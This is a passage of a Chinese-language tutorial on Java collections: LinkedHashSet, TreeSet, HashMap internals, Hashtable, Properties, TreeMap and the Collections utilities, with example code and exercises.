LinkedHashSet\n\n### 特点\n\n- LinkedHashSet 是 HashSet 的子类\n- LinkedHashSet 底层是一个 LinkedHashMap，底层维护了一个数组+双\n  向链表\n- **有序性**：LinkedHashSet 根据元素的 hashCode 值来决定元素的存储位置，同时使用链表维护元素的次序，这使得元素看起来是以插入顺序保存的\n- **不重复性**：LinkedHashSet 不允许添重复元素\n\n![](https://img.jwt1399.top/img/202208232322187.png)\n\n栗子🌰：Car类(属性:name,price),如果 name 和 price 一样，则认为是相同元素，就不能添加。\n\n```java\npackage com.jwt.set_;\n\nimport java.util.LinkedHashSet;\nimport java.util.Objects;\n\npublic class LinkedHashSetExercise {\n    public static void main(String[] args) {\n        LinkedHashSet linkedHashSet = new LinkedHashSet();\n        linkedHashSet.add(new Car(\"奥拓\", 1000));//OK\n        linkedHashSet.add(new Car(\"奥迪\", 300000));//OK\n        linkedHashSet.add(new Car(\"法拉利\", 10000000));//OK\n        linkedHashSet.add(new Car(\"奥迪\", 300000));//加入不了\n        linkedHashSet.add(new Car(\"保时捷\", 70000000));//OK\n        linkedHashSet.add(new Car(\"奥迪\", 300000));//加入不了\n        System.out.println(\"linkedHashSet = \" + linkedHashSet);\n    }\n\n}\n\nclass Car{\n    private String name;\n    private double price;\n\n    public Car(String name, double price) {\n        this.name = name;\n        this.price = price;\n    }\n\n    @Override\n    public String toString() {\n        return \"\\nCar{\" +\n                \"name='\" + name + '\\'' +\n                \", price=\" + price +\n                '}';\n    }\n    //重写equals方法和hashCode\n    //当name 和price 相同时， 就返回相同的hashCode 值, equals 返回t\n    @Override\n    public boolean equals(Object o) {\n        if (this == o) {\n            return true;\n        }\n        if (o == null || getClass() != o.getClass()) {\n            return false;\n        }\n        Car car = (Car) o;\n        return Double.compare(car.price, price) == 0 && Objects.equals(name, car.name);\n    }\n\n    @Override\n    public int hashCode() {\n        return Objects.hash(name, price);\n    }\n}\n```\n\n## 2.3 TreeSet\n\n- 可以按照添加对象指定属性进行排序\n\n- 向TreeSet中添加的数据，要求是相同类的对象\n\n```java\nTreeSet set = new TreeSet();\nset.add(456);\nset.add(123);\nset.add(\"AA\");//报错，此处向TreeSet中添加的必须是同一类的对象\n```\n\n两种排序方式：\n\n- 自然排序（实现Comparable接口）\n  - 自然排序中，比较两个对象是否相等的标准为：compareTo()返回0，不再是equals()\n- 定制排序（comparator）\n  - 定制排序中，比较两个对象是否相同的标准为：compare() 返回0，而不是equals()\n\nTreeSet 中是通过红黑二叉树来实现对添加的数据进行去重排序，其中排序需要两种比较方式的重写来规定进行排序的类的属性。\n\n```java\npackage com.jwt.set_;\n\nimport java.util.Iterator;\nimport java.util.TreeSet;\n\npublic class TreeSet_ {\n    public static void main(String[] args) {\n      \t//默认从小到大排序\n        TreeSet set = new TreeSet();\n        set.add(34);\n        set.add(-34);\n        set.add(43);\n\t\t\t\t\n        Iterator iterator = set.iterator();\n        while (iterator.hasNext()) {\n            System.out.println(iterator.next());\n        }\n    }\n}\n```\n\n### 自然排序\n\n```java\npackage com.jwt.set_;\n\nimport java.util.Iterator;\nimport java.util.TreeSet;\n\npublic class TreeSet_ {\n    public static void main(String[] args) {\n\n        TreeSet set = new TreeSet();\n        set.add(new Person(\"Tom\", 12));\n        set.add(new Person(\"Jerry\", 32));\n        set.add(new Person(\"Jim\", 2));\n        set.add(new Person(\"Mike\", 65));\n        set.add(new Person(\"Jack\", 33));\n        set.add(new Person(\"Jack\", 56));\n\n        Iterator iterator = set.iterator();\n        while (iterator.hasNext()) {\n            System.out.println(iterator.next());\n        }\n    }\n}\n\n\nclass Person implements Comparable{\n    private String name;\n    private int age;\n\n    public Person(String name, int age) {\n        this.name = name;\n        this.age = age;\n    }\n\n    public String getName() {\n        return name;\n    }\n\n    public int getAge() {\n        return age;\n    }\n\n    @Override\n    public String toString() {\n        return \"Person{\" +\n                \"name='\" + name + '\\'' +\n                \", age=\" + age +\n                '}';\n    }\n\n    @Override\n    public int compareTo(Object o) {\n        if (o instanceof Person) {\n            Person p1 = (Person) o;\n//            return Integer.compare(this.getAge(), p1.getAge());//按年龄从小到大\n            return this.name.compareTo(p1.name);//按姓名从大到小\n        } else {\n            throw new RuntimeException(\"输入类型不一致\");\n        }\n    }\n}\n\n```\n\n### 定制排序\n\n```java\npackage com.jwt.set_;\n\nimport java.util.Comparator;\nimport java.util.Iterator;\nimport java.util.TreeSet;\n\npublic class TreeSet_ {\n    public static void main(String[] args) {\n\n        TreeSet set = new TreeSet();\n\n        //通过定制排序实现年龄从小到大的顺序\n        Comparator com=new Comparator() {\n            @Override\n            public int compare(Object o1, Object o2) {\n                if (o1 instanceof Person && o2 instanceof Person) {\n                    Person p1 = (Person) o1;\n                    Person p2 = (Person) o2;\n                    return Integer.compare(p1.getAge(), p2.getAge());\n                } else {\n                    throw new RuntimeException(\"输入类型不一致\");\n                }\n\n            }\n        };\n        \n        TreeSet set2 = new TreeSet(com);\n        set2.add(new Person(\"Tom\", 12));\n        set2.add(new Person(\"Jerry\", 32));\n        set2.add(new Person(\"Jim\", 2));\n        set2.add(new Person(\"Mike\", 65));\n        set2.add(new Person(\"Jack\", 33));\n       \n        Iterator iterator = set2.iterator();\n\n        while (iterator.hasNext()) {\n            System.out.println(iterator.next());\n        }\n    }\n}\n\nclass Person{\n    private String name;\n    private int age;\n\n    public Person(String name, int age) {\n        this.name = name;\n        this.age = age;\n    }\n\n    public String getName() {\n        return name;\n    }\n\n    public int getAge() {\n        return age;\n    }\n\n    @Override\n    public String toString() {\n        return \"Person{\" +\n                \"name='\" + name + '\\'' +\n                \", age=\" + age +\n                '}';\n    }\n}\n```\n\n## 二、Map\n\n### 特点\n\n1) Map 用于保存具有映射关系的数据：Key-Value（双列元素）\n2) Map 中的 key 和 value 可以是任何引用类型的数据，会封装到HashMap$Node 对象中\n3) Map 中的 key 不允许重复，原因和 HashSet 一样，前面分析过源码，当当有相同的k，后添加的 value 会覆盖之前的，相当于替换\n\n```java\nMap map = new HashMap();\nmap.put(\"no1\", \"小明\");//k-v\nmap.put(\"no1\", \"小红\");//当有相同的k,就等价于替换\n//输出:{no1=小红}\n```\n\n4. Map 中的 value 可以重复\n\n```java\nmap.put(\"no1\", \"小明\");\nmap.put(\"no2\", \"小明\");\n//输出:{no2=小明, no1=小明}\n```\n\n5. Map 的 key 可以为 null, value 也可以为null \n   1. 但是 key 为 null，只能有一个\n   2. value 为 null 可以有多个\n   3. 常用 String 类作为 Map 的 key\n\n```java\nmap.put(null, \"abc\"); //ok\nmap.put(\"no4\", null); //ok\nmap.put(null, \"abcd\"); //会覆盖abc\nmap.put(\"no5\", null);//ok\n//输出：{null=abcd,, no4=null, no5=null}\n```\n\n6. key 和 value 之间存在单向对一关系，即通过指定的 key 总能找到对应的 value\n\n```java\nSystem.out.println(map.get(\"no1\"));//小明\n```\n\n7. Map 接口的常用实现类：HashMap、Hashtable、TreeMap、LinkedHashMap、Properties\n\n### 常用方法\n\n- put() 添加映射关系\n- remove() 根据键删除映射关系\n- get() 根据键获取值\n- size() 获取元素个数\n- isEmpty() 判断个数是否为0\n- containsKey() 查找键是否存在\n- clear() 清除映射关系\n- getOrDefault(key, defaultValue) 获取指定 key 对应对 value，如果找不到 key ，则返回设置的默认值。\n\n```java\npackage com.jwt.map_;\n\nimport java.util.HashMap;\nimport java.util.Map;\n\npublic class MapMethod {\n    public static void main(String[] args) {\n        Map map = new HashMap();\n        //put:添加映射关系\n        map.put(\"no1\", \"小明\");//OK\n        map.put(\"no2\", \"小红\");//OK\n        System.out.println(\"map=\" + map);\n        // remove:根据键删除映射关系\n        map.remove(\"no2\");\n        System.out.println(\"map=\" + map);\n        // get：根据键获取值\n        Object val = map.get(\"no1\");\n        System.out.println(\"val=\" + val);\n        // size:获取元素个数\n        System.out.println(\"k-v=\" + map.size());\n        // isEmpty:判断个数是否为0\n        System.out.println(map.isEmpty());//F\n        // containsKey:查找键是否存在\n        System.out.println(\"结果=\" + map.containsKey(\"no1\"));//T\n        // clear:清除k-v\n        map.clear();\n        System.out.println(\"map = \" + map);\n    }\n}\n\n/*\nmap={no2=小红, no1=小明}\nmap={no1=小明}\nval=小明\nk-v=1\nfalse\n结果=true\nmap = {}\n*/\n```\n\n### 遍历\n\n#### keySet:获取所有的键\n\n```java\npackage com.jwt.map_;\n\nimport java.util.HashMap;\nimport java.util.Iterator;\nimport java.util.Map;\nimport java.util.Set;\n\npublic class MapFor {\n    public static void main(String[] args) {\n        Map map = new HashMap();\n        map.put(\"邓超\", \"孙俪\");\n        map.put(\"王宝强\", \"马蓉\");\n        map.put(\"宋喆\", \"马蓉\");\n        map.put(\"刘令博\", null);\n        map.put(null, \"刘亦菲\");\n        map.put(\"鹿晗\", \"关晓彤\");\n        //方法1: 先取出所有的Key , 通过Key 取出对应的Value\n        Set keyset = map.keySet();\n        //(1) 增强for\n        System.out.println(\"-----第一种方式-------\");\n        for (Object key : keyset) {\n            System.out.println(key + \"-\" + map.get(key));\n        }\n        //(2) 迭代器\n        System.out.println(\"----第二种方式--------\");\n        Iterator iterator = keyset.iterator();\n        while (iterator.hasNext()) {\n            Object key = iterator.next();\n            System.out.println(key + \"-\" + map.get(key));\n        }\n    }\n}\n```\n\n#### values:获取所有的值\n\n```java\npackage com.jwt.map_;\n\nimport java.util.*;\n\npublic class MapFor {\n    public static void main(String[] args) {\n        Map map = new HashMap();\n        map.put(\"邓超\", \"孙俪\");\n        map.put(\"王宝强\", \"马蓉\");\n        map.put(\"宋喆\", \"马蓉\");\n        map.put(\"刘令博\", null);\n        map.put(null, \"刘亦菲\");\n        map.put(\"鹿晗\", \"关晓彤\");\n\n        //方法2: 把所有的values 取出\n        Collection values = map.values();\n        //这里可以使用所有的Collections 使用的遍历方法\n        //(1) 增强for\n        System.out.println(\"---取出所有的value 增强for----\");\n        for (Object value : values) {\n            System.out.println(value);\n        }\n        //(2) 迭代器\n        System.out.println(\"---取出所有的value 迭代器----\");\n        Iterator iterator2 = values.iterator();\n        while (iterator2.hasNext()) {\n            Object value = iterator2.next();\n            System.out.println(value);\n        }\n    }\n}\n```\n\n#### entrySet:获取所有关系k-V\n\n```java\npackage com.jwt.map_;\n\nimport java.util.*;\npublic class MapFor {\n    public static void main(String[] args) {\n        Map map = new HashMap();\n        map.put(\"邓超\", \"孙俪\");\n        map.put(\"王宝强\", \"马蓉\");\n        map.put(\"宋喆\", \"马蓉\");\n        map.put(\"刘令博\", null);\n        map.put(null, \"刘亦菲\");\n        map.put(\"鹿晗\", \"关晓彤\");\n\n        //方法3: 通过EntrySet 来获取k-v\n        Set entrySet = map.entrySet();// EntrySet<Map.Entry<K,V>>\n        //(1) 增强for\n        System.out.println(\"----使用EntrySet 的for 增强----\");\n        for (Object entry : entrySet) {\n            //将entry 转成Map.Entry\n            Map.Entry m = (Map.Entry) entry;\n            System.out.println(m.getKey() + \"-\" + m.getValue());\n        }\n        //(2) 迭代器\n        System.out.println(\"----使用EntrySet 的迭代器----\");\n        Iterator iterator3 = entrySet.iterator();\n        while (iterator3.hasNext()) {\n            Object entry = iterator3.next();\n            Map.Entry m = (Map.Entry) entry;\n            System.out.println(m.getKey() + \"-\" + m.getValue());\n        }\n    }\n}\n```\n\n### 练习\n\n使用 HashMap 添加 3 个员工对象，要求 键:员工id、值:员工对象，并遍历显示工资 > 18000的员工(遍历方式最少两种)，员工类:姓名、工资、员工id\n\n```java\npackage com.jwt.map_;\n\nimport java.util.HashMap;\nimport java.util.Iterator;\nimport java.util.Map;\nimport java.util.Set;\n\npublic class MapExercise {\n    public static void main(String[] args) {\n        Map map = new HashMap();\n        map.put(\"1\",new Employee(\"小明\",20000,1));\n        map.put(\"2\",new Employee(\"小红\",30000,2));\n        map.put(\"3\",new Employee(\"小刚\",10000,3));\n\n        //方法1 使用keySet -> 增强for\n        Set set = map.keySet();\n        for (Object key :set) {\n            //先获取value\n            Employee emp = (Employee) map.get(key);\n            if (emp.getSal() > 18000){\n                System.out.println(\"emp = \" + emp);\n            }\n        }\n\n        //方法2 使用EntrySet -> 迭代器\n        Set set1 = map.entrySet();\n        Iterator iterator = set1.iterator();\n        while (iterator.hasNext()) {\n            Map.Entry entry = (Map.Entry) iterator.next();\n            Employee emp = (Employee) entry.getValue();\n            if (emp.getSal() > 18000){\n                System.out.println(\"emp = \" + emp);\n            }\n        }\n    }\n}\n\nclass Employee{\n    private String name;\n    private double sal;\n    private int id;\n\n    public Employee(String name, double sal, int id) {\n        this.name = name;\n        this.sal = sal;\n        this.id = id;\n    }\n\n    public String getName() {\n        return name;\n    }\n\n    public double getSal() {\n        return sal;\n    }\n\n    public int getId() {\n        return id;\n    }\n\n    @Override\n    public String toString() {\n        return \"Employee{\" +\n                \"name='\" + name + '\\'' +\n                \", sal=\" + sal +\n                \", id=\" + id +\n                '}';\n    }\n}\n```\n\n## 1、HashMap\n\n### 特点\n\n- HashMap 是 Map 接口使用频率最高的实现类。\n- HashMap 是以 key-val  的方式来存储数据(HashMap$Node类型) \n- key不能重复，但是值可以重复，允许使用 null 键和 null 值。\n- 如果添加相同的 key，则会覆盖原来的 key-val ，等同于修改（key不会替换，val 会替换）\n- 与 HashSet 一样，不保证映射的顺序，因为底层是以 hash 表的方式来存储的（hashMap底层 数组+链表+红黑树)\n- HashMap 没有实现同步，因此是线程不安全的，方法没有做同步互斥的操作，没有 synchronized\n\n### 底层机制及源码剖析\n\n- HashMap 底层维护了 Node 类型的数组 table，默认为 null\n- 当创建对象时，将加载因子(loadfactor)初始化为 0.75\n- 当添加 key-val 时通过 key 的哈希值得到在 table 的索引，然后判断该索引处是否有元素\n  - 如果没有元素直接添加\n  - 如果该索引处有元素，判断该元素的 key 和准备加入的 key 是否相等\n    - 如果相等，则直接替换 val\n    - 如果不相等需要判断是树结构还是链表结构，做出相应处理\n    - 如果添加时发现容量不够，则需要扩容。\n- 第1次添加，则需要扩容 table 容量为 16，临界值(threshold)为12 (16*0.75)\n- 以后再扩容，则需要扩容 table 容量为原来的 2 倍(32)，临界值为原来的 2倍，即24，依次类推\n- 在 Java8 中，如果一条链表的元素个数超过 TREEIFY_THRESHOLD(默认是8)，并且 table 的大小 >= MIN_TREEIFY_CAPACITY(默认64)，就会进行树化(红黑树) \n\n```java\npackage com.jwt.map_;\n\nimport java.util.HashMap;\n\npublic class HashMapSource1 {\n    public static void main(String[] args) {\n        HashMap map = new HashMap();\n        map.put(\"java\", 10);//ok\n        map.put(\"php\", 10);//ok\n        map.put(\"java\", 20);//替换value\n        System.out.println(\"map=\" + map);\n    }\n}\n```\n\n1. 执行构造器new HashMap()\n\n```java\n初始化加载因子loadfactor = 0.75\nHashMap$Node[] table = null\n```\n\n2. 执行put 调用 hash 方法\n\n```java\n//计算key 的hash 值(h = key.hashCode()) ^ (h >>> 16)\npublic V put(K key, V value) {//K = \"java\" value = 10\n  return putVal(hash(key), key, value, false, true);\n}\n```\n\n3. 执行putVal\n\n```java\nfinal V putVal(int hash, K key, V value, boolean onlyIfAbsent,\n               boolean evict) {\n    Node<K, V>[] tab;Node<K, V> p;int n, i;//辅助变量\n//如果底层的table 数组为null, 或者length =0 , 就扩容到16\n    if ((tab = table) == null || (n = tab.length) == 0)\n        n = (tab = resize()).length;\n//取出hash值对应table的索引位置的Node, 如果为null, 就直接加入k-v\n    if ((p = tab[i = (n - 1) & hash]) == null)\n        //创建成一个Node ,加入该位置即可\n        tab[i] = newNode(hash, key, value, null);\n    else {\n        Node<K, V> e;K k;//辅助变量\n// 如果table的索引位置的key的hash和新的key的hash值相同，\n// 并满足(table现有的结点的key和准备添加的key是同一个对象||equals 返回真)\n// 就认为不能加入新的k-v\n        if (p.hash == hash &&\n            ((k = p.key) == key || (key != null && key.equals(k))))\n            e = p;\n//如果当前的table已有的Node是红黑树，就按照红黑树的方式处理\n        else if (p instanceof TreeNode)\n            e = ((TreeNode<K, V>) p).putTreeVal(this, tab, hash, key, value);\n        else {\n//如果找到的结点，后面是链表，就循环比较\n            for (int binCount = 0; ; ++binCount) {//死循环\n                if ((e = p.next) == null) {//如果整个链表，没有和他相同,就加到该链表的最后\n                    p.next = newNode(hash, key, value, null);\n//加入后，判断当前链表的个数，是否已经到8个，到8个后\n//就调用treeifyBin 方法进行红黑树的转换\n                    if (binCount >= TREEIFY_THRESHOLD - 1)\n                        treeifyBin(tab, hash);\n                    break;\n                }\n                if (e.hash == hash && //如果在循环比较过程中，发现有相同,就break,就只是替换value\n                        ((k = e.key) == key || (key != null && key.equals(k))))\n                    break;\n                p = e;\n            }\n        }\n        if (e != null) { // existing mapping for key\n            V oldValue = e.value;\n            if (!onlyIfAbsent || oldValue == null)\n                e.value = value; //替换，key 对应value\n            afterNodeAccess(e);\n            return oldValue;\n        }\n    }\n    ++modCount;//每增加一个Node ,就size++\n    if (++size > threshold)//如size > 临界值，就扩容\n        resize();\n    afterNodeInsertion(evict);\n    return null;\n}\n```\n\n4. 关于树化(转成红黑树)\n\n```java\n//如果table为null ,或者大小还没有到64，暂时不树化，而是进行扩容.\n//否则才会真正的树化-> 剪枝\n\nfinal void treeifyBin(Node<K,V>[] tab, int hash) {\n  int n, index; Node<K,V> e;\n  if (tab == null || (n = tab.length) < MIN_TREEIFY_CAPACITY)\n  \tresize();\n}\n```\n\n## 2、Hashtable\n\n### 特点\n\n- 存放的元素是键值对：即 K-V\n- Hashtable 的键和值都不能为 null，否则会抛出 NullPointerException\n\n```java\nHashtable table = new Hashtable();//ok\ntable.put( \"john\", 100); //ok\ntable.put(null, 100); //异常\ntable.put(\"john\", null);//异常\ntable.put(\"john\", 200);//替换\n```\n\n- Hashtable 使用方法基本上和 HashMap 一样\n- Hashtable 是线程安全的 (synchronized)， HashMap 是线程不安全的\n\n### Hashtable和HashMap对比\n\n|           | 版本 | 线程安全(同步) | 效率 | 允许null键null值 |\n| --------- | ---- | -------------- | ---- | ---------------- |\n| HashMap   | 1.2  | 不安全         | 高   | 可以             |\n| Hashtable | 1.0  | 安全           | 较低 | 不可以           |\n\n## 3、Properties\n\n### 特点\n\n- Properties 类继承自 Hashtable 类并且实现了 Map 接口，也是使用一种键值对的形式来保存数据。\n\n- Properties 使用特点和 Hashtable 类似，key 和 value 不能为 null\n- Properties 还可以用于从 xxx.properties 文件中，加载数据到 Properties 类对象，并进行读取和修改\n- xxx.properties 文件通常作为配置文件，这个知识点在 IO 流会讲解\n\n### 基本使用\n\n```java\npackage com.jwt.set_;\n\nimport java.util.Properties;\npublic class Properties_ {\n    public static void main(String[] args) {\n        //创建\n        Properties properties = new Properties();\n        //properties.put(null, \"abc\");//抛出空指针异常\n        //properties.put(\"abc\", null); //抛出空指针异常\n        //增加\n        properties.put(\"john\", 100);//k-v\n        properties.put(\"lucy\", 100);\n        properties.put(\"lic\", 100);\n        properties.put(\"lic\", 88);//如果有相同的key，value被替换\n        System.out.println(\"properties=\" + properties);\n        //通过k 获取对应值\n        System.out.println(properties.get(\"lic\"));//88\n        //删除\n        properties.remove(\"lic\");\n        System.out.println(\"properties=\" + properties);\n        //修改\n        properties.put(\"john\", \"约翰\");\n        System.out.println(\"properties=\" + properties);\n    }\n}\n```\n\n## 4、TreeMap\n\nTreeMap 保证按照添加的 key-value 对进行排序，实现排序遍历。此时使用 key 的自然排序或定制排序。底层使用红黑树\n\n### 自然排序\n\n```java\nclass Student implements Comparable{\n     \n     ....\n     \n    @Override\n    public int compareTo(Object o) {\n        if (o instanceof Student) {\n            Student s = (Student) o;\n            int com = -this.name.compareTo(s.name);\n            if (com != 0) {\n                return com;\n            } else {\n                return Integer.compare(this.age, s.age);\n            }\n        }else\n            throw new RuntimeException();\n    }\n}\n\n```\n\n### 定制排序\n\n```java\nTreeMap map1 = new TreeMap(new Comparator() {\n            @Override\n            public int compare(Object o1, Object o2) {\n                if (o1 instanceof Student && o2 instanceof Student) {\n                    Student s1 = (Student) o1;\n                    Student s2 = (Student) o2;\n                    return Integer.compare(s1.getAge(), s2.getAge());\n                } else {\n                    throw new RuntimeException(\"类型不匹配\");\n                }\n            }\n        });\n```\n\n## 5、LinkedHashMap\n\n- LinkedHashMap 继承自 HashMap，所以它的底层仍然是基于拉链式散列结构即由数组和链表或红黑树组成。\n\n- 另外，LinkedHashMap 在上面结构的基础上，增加了一条双向链表，使得上面的结构可以保持键值对的插入顺序。同时通过对链表进行相应的操作，实现了访问顺序相关逻辑。\n\n[超详细LinkedHashMap解析](https://blog.csdn.net/qq_40050586/article/details/105851970?ops_request_misc=%7B%22request%5Fid%22%3A%22164138590416780265473460%22%2C%22scm%22%3A%2220140713.130102334..%22%7D&request_id=164138590416780265473460&biz_id=0&utm_medium=distribute.pc_search_result.none-task-blog-2~all~sobaiduend~default-3-105851970.pc_search_insert_es_download_v2&utm_term=LinkHashMap&spm=1018.2226.3001.4187)\n\n## 6、ConcurrentHashMap\n\n线程安全的HashMap\n\n。。。\n\n## 三、Collections 工具类\n\n### 简介\n\n- Collections 是一个操作 Set、List 和Map 等集合的工具类\n\n- Collections 中提供了一系列静态的方法对集合元索进行排序、查询和修改等操作\n\n### 常用方法\n\n- reverse(List): 反转 List 中元素的顺序\n- shuffle(List): 对List 集合元索进行随机排序\n- sort(List): 根据元素的自然顺序对指定 List 集合元素按升序排序\n- sort(List, Comparator): 根据指定的 Comparator 产生的顺序对 List 集合元素进行排序\n- swap(List, int, int): 将指定 List 集合中的 i 处元素和 j 处元素进行交换\n- Object max(Collection): 根据元素的自然顺序，返回给定集合中的最大元素\n- Object max(Collection, Comparator): 根据Comparator 指定的顺序，返回给定集合中的最大元素\n3) Object min(Collection)\n4) Object min(Collection, Comparator)\n5) int frequency(Collection, Object): 返回指定集合中指定元素的出现次数\n6) void copy(List dest,List src): 将 src 中的内容复制到 dest 中\n- boolean replaceAll(List list, Object oldVal, Object newVal): 使用新值替换List对象的所有旧值\n\n```java\npackage com.jwt.map_;\n\nimport java.util.ArrayList;\nimport java.util.Collections;\nimport java.util.Comparator;\nimport java.util.List;\npublic class Collections_ {\n    public static void main(String[] args) {\n        //创建ArrayList 集合，用于测试.\n        List list = new ArrayList();\n        list.add(\"tom\");\n        list.add(\"smith\");\n        list.add(\"king\");\n        list.add(\"milan\");\n        list.add(\"tom\");\n        System.out.println(\"自然顺序list=\" + list);\n        // reverse(List)：反转List 中元素的顺序\n        Collections.reverse(list);\n        System.out.println(\"反转list=\" + list);\n\n        // shuffle(List)：对List 集合元素进行随机排序\n         for (int i = 0; i < 3; i++) {\n         Collections.shuffle(list);\n         System.out.println(\"随机排序list=\" + list);\n         }\n\n        // sort(List)：根据元素的自然顺序对指定List 集合元素按升序排序\n        Collections.sort(list);\n        System.out.println(\"自然排序后list=\" + list);\n\n        // sort(List，Comparator)：根据指定的Comparator 产生的顺序对List 集合元素进行排序\n        //我们希望按照字符串的长度大小排序\n        Collections.sort(list, new Comparator() {\n            @Override\n            public int compare(Object o1, Object o2) {\n                return ((String) o2).length() - ((String) o1).length();\n            }\n        });\n        System.out.println(\"字符串长度大小排序=\" + list);\n\n        // swap(List，int， int)：将指定list 集合中的i 处元素和j 处元素进行交换\n        Collections.swap(list, 0, 1);\n        System.out.println(\"交换后的情况\");\n        System.out.println(\"list=\" + list);\n\n\n        //Object max(Collection)：根据元素的自然顺序，返回给定集合中的最大元素\n        System.out.println(\"自然顺序最大元素=\" + Collections.max(list));\n\n        //Object max(Collection，Comparator)：根据Comparator 指定的顺序，返回给定集合中的最大元素\n        //比如，我们要返回长度最大的元素\n        Object maxObject = Collections.max(list, new Comparator() {\n            @Override\n            public int compare(Object o1, Object o2) {\n                return ((String)o1).length() - ((String)o2).length();\n            }\n        });\n        System.out.println(\"长度最大的元素=\" + maxObject);\n\n        //int frequency(Collection，Object)：返回指定集合中指定元素的出现次数\n        System.out.println(\"tom 出现的次数=\" + Collections.frequency(list, \"tom\"));\n\n        //void copy(List dest,List src)：将src 中的内容复制到dest 中\n        ArrayList dest = new ArrayList();\n        //为了完成一个完整拷贝，我们需要先给dest 赋值，大小和list.size()一样\n        for(int i = 0; i < list.size(); i++) {\n            dest.add(\"\");\n        }\n        //拷贝\n        Collections.copy(dest, list);\n        System.out.println(\"dest=\" + dest);\n        \n        //boolean replaceAll(List list，Object oldVal，Object newVal)：使用新值替换List 对象的所有旧值\n        //如果list 中，有tom 就替换成汤姆\n        Collections.replaceAll(list, \"tom\", \"汤姆\");\n        System.out.println(\"list 替换后=\" + list);\n    }\n}\n```\n\n## 四、集合总结\n\n### 集合数据结构\n\n#### List\n\n| List       | 结构       | 图                                                  |\n| ---------- | ---------- | --------------------------------------------------- |\n| ArrayList  | Object数组 | ![](https://img.jwt1399.top/img/interview-8-01.png) |\n| Vector     | Object数组 | 同 ArrayList                                        |\n| LinkedList | 双向链表   | ![](https://img.jwt1399.top/img/interview-9-03.png) |\n\n#### Set\n\n- HashSet：数组+链表+红黑树(同HashMap)\n- LinkedHashSet： 数组+双向链表+红黑树(同LinkedHashMap)\n- TreeSet：红黑树(同 TreeMap)\n\n#### Map\n\n| Map           | 结构                 | 图                                                           |\n| ------------- | -------------------- | ------------------------------------------------------------ |\n| HashMap       | 数组+链表+红黑树     | ![](https://img.jwt1399.top/img/image-20220328194142473.png) |\n| Hashtable     | 数组+链表            | ![](https://img.jwt1399.top/img/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQwMDUwNTg2,size_16,color_FFFFFF,t_70-20220328201449674.png) |\n| LinkedHashMap | 数组+双向链表+红黑树 | ![](https://img.jwt1399.top/img/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQwMDUwNTg2,size_16,color_FFFFFF,t_70.png) |\n| TreeMap       | 红黑树               | ![](https://img.jwt1399.top/img/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80MzgyMDU0Mg==,size_16,color_FFFFFF,t_70.png) |\n\n### 集合选取\n\n在开发中，选择什么集合实现类，主要取决于业务操作特点，然后根据集合实现类特性进行选择，分析如下:\n\n先判断存储的类型(一组对象[单列]或一组键值对[双列])\n\n1. 一组对象[单列]: Collection 接口\n\n- 允许重复: List\n  - 增删多: LinkedList-线程不安全\n  - 改查多: ArrayList-线程不安全、Vector-线程安全\n- 不允许重复: Set\n  - 无序: HashSet\n  - 排序: TreeSet\n  - 插入和取出顺序一致: LinkedHashSet \n\n2. 一组键值对[双列]: Map 接口\n\n- 键无序: HashMap-线程不安全 、Hashtable-线程安全\n- 键排序: TreeMap\n- 键插入和取出顺序一致: LinkedHashMap-线程不安全\n- 读取文件: Properties\n\n![](https://img.jwt1399.top/img/webp.png)\n\n\n\n### 参考\n\n- http://www.codebaoku.com/it-java/it-java-233918.html\n\n- [Java集合框架图解_Zhou Jiang的博客-CSDN博客_java集合图解](https://blog.csdn.net/oman001/article/details/104843676)\n\n- [java-集合框架底层数据结构总结_Devil_566的博客-CSDN博客_java集合底层数据结构](https://blog.csdn.net/qq_28033239/article/details/98204664)\n- [面经手册 · 第8篇《LinkedList插入速度比ArrayList快？你确定吗？》 | bugstack 虫洞栈](https://bugstack.cn/md/java/interview/2020-08-30-面经手册 · 第8篇《LinkedList插入速度比ArrayList快？你确定吗？》.html)\n- [HashTable详解_求offer的菜鸡的博客-CSDN博客](https://blog.csdn.net/qq_40050586/article/details/105720295?spm=1001.2014.3001.5502)\n- [超详细LinkedHashMap解析](https://blog.csdn.net/qq_40050586/article/details/105851970?ops_request_misc=%7B%22request%5Fid%22%3A%22164138590416780265473460%22%2C%22scm%22%3A%2220140713.130102334..%22%7D&request_id=164138590416780265473460&biz_id=0&utm_medium=distribute.pc_search_result.none-task-blog-2~all~sobaiduend~default-3-105851970.pc_search_insert_es_download_v2&utm_term=LinkHashMap&spm=1018.2226.3001.4187)\n- [java集合包数据结构图解](https://blog.csdn.net/weixin_43820542/article/details/99626015)\n\n##  五、本章练习\n\n###  1.编程题Homework01.java\n\n按要求实现:\n(1)封装一个新闻类，包含标题和内容属性，提供get、 set方法，重写toString方法，打印对象时只打印标题:\n(2)只提供一个带参数的构造器，实例化对象时，只初始化标题;并且实例化两个对象:\n\n- 新闻一:新冠确诊病例超千万，数百万印度教信徒赴恒河“圣浴”引民众担忧\n- 新闻二:男子突然想起2个月前钓的鱼还在网兜里，捞起一看赶紧放生\n\n(3)将新闻对象添加到ArrayList集合中，并且进行倒序遍历;\n(4)在遍历集合过程中，对新闻标题进行处理，超过15字的只保留前15个，然后在后边加“...”\n(5)在控制台打印遍历出经过处理的新闻标题;\n\n```java\npackage com.jwt.map_;\n\nimport java.util.ArrayList;\nimport java.util.Collections;\n\npublic class Homework01 {\n    public static void main(String[] args) {\n        News news1 = new News(\"新闻一:新冠确诊病例超千万，数百万印度教信徒赴恒河“圣浴”引民众担忧\");\n        News news2 = new News(\"新闻二:男子突然想起2个月前钓的鱼还在网兜里，捞起一看赶紧放生\");\n        ArrayList<News> arrayList = new ArrayList<>();\n        arrayList.add(news1);\n        arrayList.add(news2);\n\n        //方法一：使用for循环倒序 + 处理title函数\n        for (int i = arrayList.size()-1; i >= 0 ; i--) {\n            News news = arrayList.get(i);\n            System.out.println(processTitle(news.getTitle()));\n        }\n\n        //方法二：使用Collections工具类倒序 +if\n        Collections.reverse(arrayList);//反转List 中元素的顺序\n        for (News news :arrayList) {\n            if (news.getTitle().length() > 15){\n                char[] chars = news.getTitle().toCharArray();\n                for (int i = 0; i < 15; i++) {\n                    System.out.print(chars[i]);\n                }\n                System.out.println(\"...\");\n            }\n        }\n\n    }\n\n    public static String processTitle(String title) {\n        if (title.length() > 15) {\n            return title.substring(0, 15) + 